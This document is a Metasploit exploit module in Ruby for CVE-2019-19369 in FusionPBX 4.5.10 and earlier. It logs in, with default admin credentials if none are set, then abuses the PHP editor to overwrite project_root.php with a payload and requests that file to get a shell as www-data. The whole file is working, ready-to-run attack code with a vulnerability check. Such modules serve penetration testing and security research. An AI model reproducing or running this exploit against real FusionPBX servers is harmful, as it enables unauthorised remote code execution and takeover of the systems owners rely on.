####################################################################
# This module requires Metasploit: https://metasploit.com/download #
#  Current source: https://github.com/rapid7/metasploit-framework  #
####################################################################

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
        "Name" => "FusionPBX PHPEditor Authenticated Remote Code Execution",
        "Description" =>  %q{
          Authenticated Remote Code Execution in FusionPBX web appliances.
          Affected versions: =< 4.5.10
          By using the on site PHP-Editor function users can overwrite PHP files on the web server
          with a trojan horse and get a shell as www-data by navigating to the changed PHP file location.
        },
        "License" => MSF_LICENSE,
        'Author' => [
          'enjloezz', # Metasploit Module
          'TheCyberGeek' # Discovery and Metasploit Module
        ],
        'References' =>
        [
            ['URL','https://github.com/fusionpbx/fusionpbx/releases'],
            ['CVE','2019-19369']
        ],
        "Platform" => "php",
        "Arch" => ARCH_PHP,
        "Targets" => [
          ["FusionPBX", {}],
        ],
        "Privileged" => false,
        "DisclosureDate" => "Jan 21 2020",
        "DefaultTarget" => 0
      ))
    register_options(
      [
        OptString.new("TARGETURI", [true, "The URI of the FusionPBX Application", "/"]),
        OptString.new("USERNAME", [true, "The Username of the FusionPBX Application", "admin"]),
        OptString.new("PASSWORD", [true, "The Password of the FusionPBX Application", "fusion"]),
      ]
    )
  end

  def exploit
    begin
      res = send_request_cgi(
        "uri" => normalize_uri(target_uri.path, "login.php"),
        "method" => "GET",
      )
      if res && res.code == 200
        @phpsessid = res.get_cookies
        /token\".*value=\"(?<token>.*?)\"/ =~ res.body
        res = send_request_cgi!(
          "uri" => normalize_uri(target_uri.path, "/core/user_settings/user_dashboard.php"),
          "method" => "POST",
          "cookie" => @phpsessid,
          "vars_post" => {
            "username" => datastore["USERNAME"],
            "password" => datastore["PASSWORD"],
          },
        )
        if res.body.include? "href='/logout.php'"
          print_good("Login Successful!")
          upload
        else
          vprint_error("Cannot login to FusionPBX")
        end
      else
        vprint_error("Couldn't get token, check your TARGETURI")
      end
    rescue ::Rex::ConnectionError
      vprint_error("Connection error...")
    end
  end

  def upload
    res = send_request_cgi({
      "uri" => normalize_uri(target_uri.path, "/app/edit/index.php"),
      "vars_get" => {
         "dir" => "php"
      },
      "method" => "GET",
      "cookie" => @phpsessid
      },
    )
    /id=\'token\'.*value=\'(?<token>.*?)\'/ =~ res.body
    payload_name = '/var/www/fusionpbx/project_root.php'
    boundary = Rex::Text.rand_text_hex(16)
    post_data =  "------#{boundary}\r\n"
    post_data << "Content-Disposition: form-data; name=\"filepath\"\r\n\r\n"
    post_data << "#{payload_name}\r\n"
    post_data << "------#{boundary}\r\n"
    post_data << "Content-Disposition: form-data; name=\"content\"\r\n\r\n"
    post_data << "#{payload.encoded}\r\n"
    post_data << "------#{boundary}\r\n"
    post_data << "Content-Disposition: form-data; name=\"token\"\r\n\r\n"
    post_data << "#{token}\r\n"
    post_data << "------#{boundary}\r\n"
    post_data << "Content-Disposition: form-data; name=\"mode\"\r\n\r\n"
    post_data << "php\r\n"
    post_data << "------#{boundary}--\r\n"
    print_status("#{peer} - Saving PHP payload (#{payload_name})")
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri, "/app/edit/file_save.php"),
      'cookie' => @phpsessid,
      'ctype'	=> "multipart/form-data; boundary=----#{boundary}",
      'data' => post_data
      },
    )
    if res.code == 200
      print_good("Uploaded Successfully!")
      exec
    end
  end

  def exec
    fname = "project_root.php"
    print_status("#{peer} - Executing /#{fname}...")
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, "/project_root.php")
    })
    if res and res.code == 404
      fail_with(Failure::NotFound, "#{peer} - Not found: #{@fname}")
    end
  end
  
  def version
    res = send_request_cgi({
      "uri" => normalize_uri(target_uri.path, "/app/edit/index.php"),
      "vars_get" => {
         "dir" => "php"
      },
      "method" => "GET",
      "cookie" => @phpsessid
      },
    )
    if res and res.code == 200
      # Found PHP editor. This version is vulnerable.
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Safe
    end
  end

  def check
    begin
      res = send_request_cgi(
        "uri" => normalize_uri(target_uri.path, "login.php"),
        "method" => "GET",
      )
      if res && res.code == 200
        @phpsessid = res.get_cookies
        /token\".*value=\"(?<token>.*?)\"/ =~ res.body
        res = send_request_cgi!(
          "uri" => normalize_uri(target_uri.path, "/core/user_settings/user_dashboard.php"),
          "method" => "POST",
          "cookie" => @phpsessid,
          "vars_post" => {
            "username" => datastore["USERNAME"],
            "password" => datastore["PASSWORD"],
          },
        )
        if res.body.include? "href='/logout.php'"
          version
        else
          vprint_error("Cannot login to FusionPBX")
        end
      else
        vprint_error("Couldn't get token, check your TARGETURI")
      end
    rescue ::Rex::ConnectionError
      vprint_error("Connection error...")
    end
  end  
end
